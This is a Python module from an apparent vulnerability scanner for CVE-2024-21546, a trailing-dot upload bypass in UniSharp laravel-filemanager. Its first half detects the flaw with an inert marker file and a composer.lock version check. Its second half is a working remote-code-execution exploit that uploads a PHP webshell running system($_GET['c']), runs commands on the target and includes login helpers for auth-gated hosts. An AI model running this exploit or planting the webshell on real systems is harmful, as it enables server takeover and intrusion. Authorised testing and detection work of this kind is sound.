#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-21546')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-21546 detector for UniSharp laravel-filemanager <= 2.9.0.

The bug: LfmUploadValidator::extensionIsNotExcutable() blocklists the extensions ['php','html'] via
getClientOriginalExtension(). A filename ending in a trailing dot ("shell.php.") parses to an EMPTY
extension, so the blocklist never fires, while a PNG magic-byte prefix makes the detected mimetype
"image/png" (passing the mime check). LfmPath::getNewName() then strips the empty extension and saves
the file as "shell.php" under the public storage dir -> remote PHP execution. Fixed in 2.9.1, which
adds Lfm::extensionIsValid() (regex rejecting non-alphanumeric extension chars) + throws
InvalidExtensionException.

SAFETY MODEL (matches the project convention — see cve_2025_14894 "safe proof point" and
cve_2024_47823 "harmless payload"): check.py runs against arbitrary / production targets, so this
detector proves the trailing-dot BYPASS-WRITE without ever planting executable code. It uploads a
PNG-magic file named "<rand>.php." (the trailing-dot bypass) whose body is INERT — a literal marker
string, NO "<?php" tag, no command, no attacker input. It then fetches the saved
/storage/files/<rand>.php; because the saved file contains no PHP open tag, Apache+PHP emit its bytes
verbatim, so the marker appears in the response IFF the bypass actually landed a ".php" file at a
PHP-executing web path. A patched host (>= 2.9.1, InvalidExtensionException) rejects the upload, the
marker is absent, and the verdict flips clean. This proves write-as-.php (the vulnerability), not RCE
— the same bar cve_2025_14894 accepts.

Cleanup: like cve_2024_47823 (which also leaves its harmless test.php), the inert marker file is left
in place — it is non-executable text, not a webshell. LFM exposes no unauthenticated delete route, so
no best-effort cleanup is attempted. Nothing executable is ever written, so there is nothing to harm.

Returns a dict (or None). Status strings: "VULNERABLE"/"Detected" on a hit, "not detected" on a miss
(the lifecycle harness keys on these).
"""

import re
import secrets
from typing import Dict, Optional
from urllib.parse import unquote, urljoin

import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Where the LFM file manager / upload route may live (root prefix and the default 'filemanager'/
# 'laravel-filemanager' prefixes). Each entry is the base under which '/upload' is reachable.
# 'sc_admin/uploads' is the legacy S-Cart-style mount (route group prefix
# SC_ADMIN_PREFIX='sc_admin' + the LFM route group prefix 'uploads') -- admin-auth-gated,
# see exploit() login. Current shipped labs exercise three deployments: the standalone
# unauthenticated LFM 2.8.1 package harness (Lfm::routes() mounted directly under /filemanager,
# no auth middleware) on 35002/36002; the S-Cart v8.17 storefront embedding LFM 2.8.1, whose sink
# sits behind the admin route group /sc_admin/uploads/upload, on 35001/36001; and the Badaso app
# harness (LFM 2.6.x behind /filemanager, web+auth) on 41013/42013.
LFM_PREFIXES = ("", "filemanager", "laravel-filemanager", "admin/filemanager",
                "admin/laravel-filemanager", "sc_admin/uploads")

PNG_MAGIC = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c6360000002000154a24f5d0000000049454e44ae426082"
)


# Where /composer.lock may be web-served (root, or aliased under an admin/app prefix). The shipped
# labs (standalone unauth package harness, S-Cart, Badaso) deliberately alias composer.lock into the
# webroot as the authoritative, auth-INDEPENDENT version signal — so an unauthenticated run can
# resolve the lfm version even when the active upload route is auth-gated (S-Cart, Badaso).
_COMPOSER_LOCK_PREFIXES = ("", "admin", "sc_admin")
_LFM_PKG = "unisharp/laravel-filemanager"


def _probe_composer_lock_lfm(base: str, sess, timeout: int) -> Optional[str]:
    """Return the pinned unisharp/laravel-filemanager version from a web-served composer.lock, or None."""
    for prefix in _COMPOSER_LOCK_PREFIXES:
        u = _join(base, prefix, "composer.lock")
        try:
            r = sess.get(u, timeout=timeout, verify=False)
        except requests.RequestException:
            continue
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        if _LFM_PKG not in body:
            continue
        try:
            data = r.json()
            for pkg in (data.get("packages", []) + data.get("packages-dev", [])):
                if pkg.get("name") == _LFM_PKG:
                    v = pkg.get("version")
                    if v:
                        return v.lstrip("vV")
        except (ValueError, AttributeError):
            m = re.search(r'"name"\s*:\s*"%s"[\s\S]{0,250}?"version"\s*:\s*"([^"]+)"' % re.escape(_LFM_PKG), body)
            if m:
                return m.group(1).lstrip("vV")
    return None


def _lfm_version_vulnerable(version: str) -> Optional[bool]:
    """True if unisharp/laravel-filemanager < 2.9.1 (the fix), False if >=, None if unparseable."""
    try:
        parts = (version.split("+")[0].split("-")[0].split("."))
        parts = [int(re.sub(r"[^0-9]", "", p) or "0") for p in (parts + ["0", "0", "0"])[:3]]
        return tuple(parts) < (2, 9, 1)
    except Exception:
        return None


def _upload_auth_headers(session: requests.Session, bearer: Optional[str] = None) -> Dict[str, str]:
    headers = {}
    xsrf = session.cookies.get("XSRF-TOKEN")
    if xsrf:
        headers["X-XSRF-TOKEN"] = unquote(xsrf)
    if bearer:
        headers["Authorization"] = "Bearer " + bearer
    return headers


def scan(target_url: str, *, session=None, username=None, password=None, timeout: int = 10, **kwargs) -> Optional[Dict]:
    sess = session or http_config.get_auth_session()
    if not target_url:
        return None

    base = _normalize_base(target_url)
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-21546"})
    bearer = None
    if session is None and username is not None and password is not None:
        try:
            bearer = _try_login(sess, base, username, password, timeout)
        except requests.RequestException:
            pass

    # ---- Version-gate (authoritative, UNAUTH) ------------------------------------------------
    # composer.lock pins the actual unisharp/laravel-filemanager version and is reachable without
    # auth on the shipped labs. A version < 2.9.1 is the definitive vulnerable signal — fire on it
    # regardless of whether the active upload probe (below) can authenticate. This was the live-FAIL
    # gap on :35001/:41013: the only detection path was the auth-gated upload, so a no-cred run missed
    # a genuinely-vulnerable target whose composer.lock (lfm 2.8.1 / 2.6.4) was right there in the webroot.
    version_result = None
    lfm_ver = _probe_composer_lock_lfm(base, sess, timeout)
    if lfm_ver and _lfm_version_vulnerable(lfm_ver) is True:
        version_result = {
            "cve": "CVE-2024-21546",
            "vulnerable": False,
            "status": "version_applicable",
            "verdict": "version_applicable",
            "proof_type": "dependency",
            "severity": "critical",
            "version": lfm_ver,
            "version_status": "vulnerable",
            "evidence": [
                f"unisharp/laravel-filemanager {lfm_ver} (< 2.9.1) pinned in web-served composer.lock",
                "authoritative unauth version signal; active upload-write confirmation is required "
                "for a confirmed_vulnerable verdict and may require auth (use -U/-P)",
            ],
            "notes": "Detected via composer.lock version gate (lfm < 2.9.1). "
                     "Mitigation: upgrade unisharp/laravel-filemanager to >= 2.9.1.",
        }

    marker = "LVS21546_" + secrets.token_hex(6)
    fname = "lvs" + secrets.token_hex(4)
    # INERT body: PNG magic + a literal marker between sentinels. There is deliberately NO "<?php"
    # tag, so the saved .php contains no executable code — Apache+PHP serve its bytes verbatim and the
    # marker reflects back, proving the .php write landed, WITHOUT planting a webshell. Safe to run
    # against production targets (project convention; see module docstring).
    payload = PNG_MAGIC + f"<{marker}>".encode()

    found_endpoint = None
    upload_status = None
    upload_body = ""
    read_attempts = []

    for prefix in LFM_PREFIXES:
        upload_url = _join(base, prefix, "upload")
        for cat in ("file", "image"):
            token = _csrf(sess, base, prefix, timeout)

            # working_dir "/" drops the file in the file-category root (folder 'files'); some configs
            # nest it under files/<working_dir>. We probe several resulting public paths below.
            data = {"working_dir": "/", "type": cat}
            if token:
                data["_token"] = token
            files = {"upload": (f"{fname}.php.", payload, "image/png")}
            headers = _upload_auth_headers(sess, bearer)

            try:
                resp = sess.post(
                    upload_url + ("?type=" + cat if cat != "file" else ""),
                    data=data,
                    files=files,
                    headers=headers or None,
                    timeout=timeout,
                    verify=False,
                )
            except requests.RequestException:
                continue

            # 404 => no LFM upload route under this prefix; keep looking under the next prefix.
            if resp.status_code == 404:
                break
            found_endpoint = upload_url
            upload_status = resp.status_code
            upload_body = (resp.text or "")[:300]

            # Try to confirm the write landed an executable .php on disk. LFM saves under the public
            # disk at <file-category-folder>/<working_dir>/<name>; the public symlink is /storage/...
            # so candidate URLs cover the category root and the nested working-dir variants.
            # S-Cart-style deployments can serve the 'uploads' disk from public/data (URL prefix
            # /data), so include /data candidates too. The single-file LFM response also carries
            # the exact saved {"url":...}.
            php = fname + ".php"
            read_candidates = []
            try:
                j = resp.json()
                saved = (j.get("url") or j.get("uploaded")) if isinstance(j, dict) else None
                if saved:
                    read_candidates.append(_join(base, "", str(saved).lstrip("/")))
            except ValueError:
                pass
            read_candidates += [
                _join(base, "", "storage/files/" + php),
                _join(base, "", "storage/files/files/" + php),
                _join(base, "", "storage/photos/" + php),
                _join(base, "", "storage/photos/1/" + php),
                _join(base, "", "storage/photos/0/" + php),
                _join(base, "", "storage/" + php),
                _join(base, "", "data/file/shares/" + php),
                _join(base, "", "data/file/" + php),
                _join(base, "", "data/shares/" + php),
                _join(base, "", "data/" + php),
            ]
            for read_url in read_candidates:
                try:
                    r2 = sess.get(read_url, timeout=timeout, verify=False)
                except requests.RequestException:
                    continue
                read_attempts.append({"url": read_url, "status": r2.status_code})
                if r2.status_code == 200 and f"<{marker}>" in r2.text:
                    return {
                        "cve": "CVE-2024-21546",
                        "vulnerable": True,
                        "status": "confirmed_vulnerable",
                        "verdict": "confirmed_vulnerable",
                        "proof_type": "safe_active",
                        "severity": "critical",
                        "version": lfm_ver,
                        "version_status": "vulnerable" if lfm_ver else "unknown",
                        "upload_endpoint": upload_url,
                        "http_status": upload_status,
                        "landed_url": read_url,
                        "evidence": [
                            "Detected UniSharp laravel-filemanager trailing-dot upload bypass",
                            f"uploaded '{fname}.php.' as LFM type '{cat}' -> saved as {fname}.php "
                            "at a web path; inert marker reflected back (no executable code written)",
                        ],
                        "notes": "Proof-of-write only: an INERT marker file (no <?php) landed as .php via "
                                 "the trailing-dot bypass; no command run, nothing executable planted. "
                                 "Mitigation: upgrade unisharp/laravel-filemanager to >= 2.9.1.",
                    }
            if version_result and any(a.get("status") == 403 for a in read_attempts):
                version_result.update(
                    {
                        "status": "blocked_by_control",
                        "verdict": "blocked_by_control",
                        "proof_type": "web_tier_control",
                        "upload_endpoint": found_endpoint,
                        "http_status": upload_status,
                    }
                )
                version_result.setdefault("artifacts", {})["upload_body"] = upload_body
                version_result["artifacts"]["read_attempts"] = read_attempts[:10]
                version_result["evidence"].append(
                    "trailing-dot upload reached the public storage readback path, but uploaded "
                    ".php execution/readback was denied by the web tier (HTTP 403)"
                )
                return version_result

    # No confirmed write. Report based on whether an LFM upload endpoint was even reachable.
    if version_result:
        if found_endpoint:
            version_result["upload_endpoint"] = found_endpoint
            version_result["http_status"] = upload_status
            version_result.setdefault("artifacts", {})["upload_body"] = upload_body
            version_result["artifacts"]["read_attempts"] = read_attempts[:10]
        return version_result

    if found_endpoint is None:
        return {
            "cve": "CVE-2024-21546",
            "vulnerable": False,
            "status": "not detected",
            "verdict": "not_detected",
            "evidence": ["No reachable UniSharp laravel-filemanager /upload route found"],
        }

    blocked = upload_status in (419, 401, 403)
    return {
        "cve": "CVE-2024-21546",
        "vulnerable": False,
        "status": "protected" if blocked else "not detected",
        "verdict": "blocked_by_control" if blocked else "not_detected",
        "upload_endpoint": found_endpoint,
        "http_status": upload_status,
        "artifacts": {
            "upload_body": upload_body,
            "read_attempts": read_attempts[:10],
        },
        "evidence": [
            "LFM upload route reachable but trailing-dot bypass not confirmed",
            "upload rejected (CSRF/auth) or patched (>=2.9.1 InvalidExtensionException)"
            if blocked else "no executable file landed under /storage (likely patched)",
        ],
        "notes": "CVE-2024-21546 not detected — endpoint present but the .php write did not execute.",
    }


def _normalize_base(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _join(base: str, prefix: str, tail: str) -> str:
    parts = [p.strip("/") for p in (prefix, tail) if p.strip("/")]
    path = "/".join(parts)
    return urljoin(base + "/", path)


def _csrf(session: requests.Session, base: str, prefix: str, timeout: int) -> Optional[str]:
    for page in ("", prefix):
        try:
            r = session.get(_join(base, page, ""), timeout=timeout, verify=False)
        except requests.RequestException:
            continue
        m = re.search(r"""name=['"]_token['"]\s+value=['"]([^'"]+)['"]""", r.text) \
            or re.search(r"""name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]""", r.text)
        if m:
            return m.group(1)
    return None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-21546 exploitation half — UniSharp laravel-filemanager trailing-dot upload RCE.

Split from the original modules/cve_2024_21546.py (detection half: modules/cves/cve_2024_21546.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import secrets

import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt real RCE via the CVE-2024-21546 trailing-dot upload bypass.

    Unlike scan() (which plants an INERT marker file to prove the write WITHOUT any executable
    code), exploit() is the offensive path: it uploads a PNG-magic-prefixed file named
    "<rand>.php." carrying a one-line system($_GET['c']) webshell, then fetches the saved
    /storage/files/<rand>.php?c=<command> and captures the command output between unique sentinels.
    success=True ONLY if the command output is observed reflected back (i.e. PHP executed).

    Some labs and real deployments auth-gate the upload route, so -U/-P are used for a best-effort
    login before upload. Pure HTTP via requests — never shells into docker. Never raises to the caller.
    """
    result = {
        "cve": "CVE-2024-21546",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not target_url:
        result.update(attempted=False, reason="no target_url provided")
        return result

    forced = _force_requested(options, **kwargs)
    detection = kwargs.get("detection") if isinstance(kwargs.get("detection"), dict) else {}
    if (
        not forced
        and detection.get("verdict") == "blocked_by_control"
        and detection.get("proof_type") == "web_tier_control"
    ):
        result.update(
            success=False,
            reason=(
                "scan already proved the trailing-dot upload reached storage but uploaded .php "
                "readback/execution is denied by the web tier"
            ),
            detail="exploit skipped redundant upload/readback sweep because hardened web-tier control was already confirmed",
            artifacts={
                "short_circuit_from_scan": True,
                "proof_type": detection.get("proof_type"),
                "scan_artifacts": detection.get("artifacts", {}),
            },
        )
        return result
    if forced and detection.get("verdict") == "blocked_by_control":
        result["artifacts"]["forced_scan_bypass"] = {
            "scan_verdict": detection.get("verdict"),
            "proof_type": detection.get("proof_type"),
        }

    operator_authed = session is not None
    cmd = command or "echo CVE-2024-21546 PoC && id && hostname"
    timeout = 20
    base = _normalize_base(target_url)

    sess = session or http_config.get_auth_session()
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-21546"})

    # If creds are supplied (real-world auth-gated LFM), best-effort login so the web/auth middleware
    # lets the upload through. Returns a JWT bearer token for token-guarded hosts (Badaso 41013), or
    # None for session-cookie hosts which seed the cookie jar in-place. Failure here is non-fatal
    # because public or already-authenticated hosts may still be reachable.
    bearer = None
    if not operator_authed:
        if username is not None and password is not None:
            try:
                bearer = _try_login(sess, base, username, password, timeout)
            except requests.RequestException:
                pass

    fname = "lvsx" + secrets.token_hex(4)
    s_open = "LVSX21546_" + secrets.token_hex(4)
    s_close = secrets.token_hex(4) + "_21546LVSX"
    # PNG magic satisfies the mimetype check; the trailing-dot ".php." name bypasses the ['php','html']
    # blocklist (empty parsed extension) and lands as ".php" on disk. Webshell wraps output in unique
    # sentinels so we can extract verbatim command output even amid PNG bytes / surrounding markup.
    php_shell = (
        f"<?php echo '{s_open}'; "
        f"system(isset($_GET['c']) ? $_GET['c'] : {_php_str(cmd)}); "
        f"echo '{s_close}'; ?>"
    )
    payload = PNG_MAGIC + php_shell.encode()

    last_upload_status = None
    last_body = ""
    read_attempts = []
    blocked_codes = set()

    # LFM gates the upload on the file's DETECTED mime being in the target category's valid_mime list.
    # The default 'file' category often allows only docs (pdf/text) and rejects image/png; the 'image'
    # category allows image/png (Badaso 41013). Try 'file' first (unchanged for existing hosts), then
    # 'image'. For hosts where 'file' already works, the image retry never runs.
    for prefix in LFM_PREFIXES:
      upload_url = _join(base, prefix, "upload")
      for cat in ("file", "image"):
        token = _csrf(sess, base, prefix, timeout)

        data = {"working_dir": "/", "type": cat}
        if token:
            data["_token"] = token
        files = {"upload": (f"{fname}.php.", payload, "image/png")}

        headers = _upload_auth_headers(sess, bearer)

        try:
            resp = sess.post(upload_url + ("?type=" + cat if cat != "file" else ""),
                             data=data, files=files, headers=headers or None,
                             timeout=timeout, verify=False)
        except requests.RequestException:
            continue

        if resp.status_code == 404:
            break  # no LFM upload route under this prefix (try next prefix, not next category)
        last_upload_status = resp.status_code
        last_body = (resp.text or "")[:300]
        if resp.status_code in (401, 403, 419):
            blocked_codes.add(resp.status_code)
            # Endpoint exists but rejected us (CSRF/auth) — keep trying, record below.
            continue

        # The .php is written to disk before LFM's thumbnail step throws ("Invalid upload request" is a
        # SUCCESS signal here), so an error body is fine. Prefer the exact saved URL from the LFM
        # single-file JSON; then probe known public-disk roots: /storage/... (public disk, incl the
        # photos/<working-dir> nesting Badaso uses) and /data/... (S-Cart 'uploads' disk).
        php = fname + ".php"
        read_candidates = []
        try:
            j = resp.json()
            saved = (j.get("url") or j.get("uploaded")) if isinstance(j, dict) else None
            if saved:
                read_candidates.append(_join(base, "", str(saved).lstrip("/")))
        except ValueError:
            pass
        read_candidates += [
            _join(base, "", "storage/files/" + php),
            _join(base, "", "storage/files/files/" + php),
            _join(base, "", "storage/photos/" + php),
            _join(base, "", "storage/photos/1/" + php),   # Badaso: public disk, photos/<working-dir-id>
            _join(base, "", "storage/photos/0/" + php),
            _join(base, "", "storage/" + php),
            _join(base, "", "data/file/shares/" + php),
            _join(base, "", "data/file/" + php),
            _join(base, "", "data/shares/" + php),
            _join(base, "", "data/" + php),
        ]
        for read_url in read_candidates:
            try:
                r2 = sess.get(read_url, params={"c": cmd}, timeout=timeout, verify=False)
            except requests.RequestException:
                continue
            read_attempts.append({"url": read_url, "status": r2.status_code})
            if r2.status_code != 200:
                continue
            text = r2.text or ""
            if s_open in text and s_close in text:
                out = text.split(s_open, 1)[1].split(s_close, 1)[0]
                out = out.strip()
                result.update(
                    success=True,
                    evidence=out if out else "(command produced no stdout, but webshell executed)",
                    detail=f"RCE via trailing-dot upload bypass; '{cmd}' executed at {read_url}",
                    artifacts={
                        "webshell_url": read_url,
                        "upload_endpoint": upload_url,
                        "uploaded_as": f"{fname}.php.",
                        "command": cmd,
                        "marker": f"{s_open}...{s_close}",
                    },
                )
                return result

    # No command output observed — explain why honestly.
    if last_upload_status is None:
        result.update(
            success=False,
            reason="no reachable UniSharp laravel-filemanager /upload route found",
            detail="LFM upload endpoint not found under any known prefix",
        )
        return result

    if blocked_codes:
        result.update(
            success=False,
            requires=(["credentials"] if not (username and password) else []),
            reason=(f"LFM /upload route reachable but rejected (HTTP {sorted(blocked_codes)}): "
                    "auth/CSRF gate. Supply -U/-P for an authenticated session."),
            detail="upload endpoint present but auth/CSRF-protected",
            artifacts={"upload_status": sorted(blocked_codes), "upload_body": last_body},
        )
        return result

    denied_php = [a for a in read_attempts if a.get("status") in (401, 403)]
    if denied_php:
        result.update(
            success=False,
            reason="upload accepted, but the uploaded .php readback was denied by the web tier "
                   "(for this lab, the hardened profile blocks PHP execution under /data and /storage)",
            detail="upload succeeded; PHP execution blocked by upload-path hardening",
            artifacts={
                "upload_status": last_upload_status,
                "upload_body": last_body,
                "read_attempts": read_attempts[:10],
            },
        )
        return result

    result.update(
        success=False,
        reason="upload accepted but no executable .php landed at a PHP-serving web path "
               "(likely patched >=2.9.1 InvalidExtensionException, upload renamed, or no public symlink)",
        detail="trailing-dot bypass did not yield code execution",
        artifacts={
            "upload_status": last_upload_status,
            "upload_body": last_body,
            "read_attempts": read_attempts[:10],
        },
    )
    return result


def _php_str(s: str) -> str:
    """Embed the default command as a single-quoted PHP string literal."""
    return "'" + str(s).replace("\\", "\\\\").replace("'", "\\'") + "'"


def _find_token(obj):
    """Recursively locate a JWT access token in a decoded JSON body (key 'accessToken' camelCase, as
    Badaso returns, or 'access_token'). Returns the string or None."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in ("accessToken", "access_token") and isinstance(v, str) and v:
                return v
            found = _find_token(v)
            if found:
                return found
    elif isinstance(obj, list):
        for v in obj:
            found = _find_token(v)
            if found:
                return found
    return None


def _try_login(session: requests.Session, base: str, username: str, password: str,
               timeout: int):
    """Best-effort login (only used when -U/-P given; non-fatal). Returns a JWT bearer token string if
    the host issued one (Badaso), else None (session-cookie hosts seed the cookie jar in-place).

    Covers three LFM hosts with one helper:
      1. Badaso JWT API: POST /badaso-api/v1/auth/login {email,password} -> JSON accessToken. Badaso's
         badaso:setup makes the JWT 'badaso_guard' the DEFAULT guard, so the returned Bearer token
         authenticates the bare-`auth` LFM upload route (CVE-2024-21546 lab 41013).
      2. S-Cart-style admin login at /sc_admin/auth/login with a 'username' field (legacy support;
         sink behind SC_ADMIN_MIDDLEWARE -> needs a real admin session cookie).
      3. Generic Laravel /login with an 'email' field (Breeze/Jetstream-style hosts).
    The JWT attempt self-gates: non-Badaso hosts 404 the endpoint -> no token -> None returned -> the
    web-form attempts run and the existing session-cookie behaviour is byte-unchanged.
    """
    # 1. Badaso JWT API login (returns a bearer token, sets no session cookie).
    jwt_url = _join(base, "", "badaso-api/v1/auth/login")
    try:
        r = session.post(jwt_url, json={"email": username, "password": password},
                         headers={"Accept": "application/json"}, timeout=timeout, verify=False)
        if r.status_code != 404 and "application/json" in r.headers.get("content-type", ""):
            tok = _find_token(r.json())
            if tok:
                return tok
    except (requests.RequestException, ValueError):
        pass

    # 2 + 3. Session-cookie web-form logins (unchanged from prior behaviour).
    attempts = (
        (_join(base, "", "sc_admin/auth/login"), "username"),
        (_join(base, "", "login"), "email"),
    )
    for login_url, field in attempts:
        try:
            r = session.get(login_url, timeout=timeout, verify=False)
        except requests.RequestException:
            continue
        if r.status_code == 404:
            continue
        m = re.search(r"""name=['"]_token['"]\s+value=['"]([^'"]+)['"]""", r.text)
        data = {field: username, "password": password}
        if m:
            data["_token"] = m.group(1)
        try:
            session.post(login_url, data=data, timeout=timeout, verify=False, allow_redirects=True)
        except requests.RequestException:
            continue
    return None
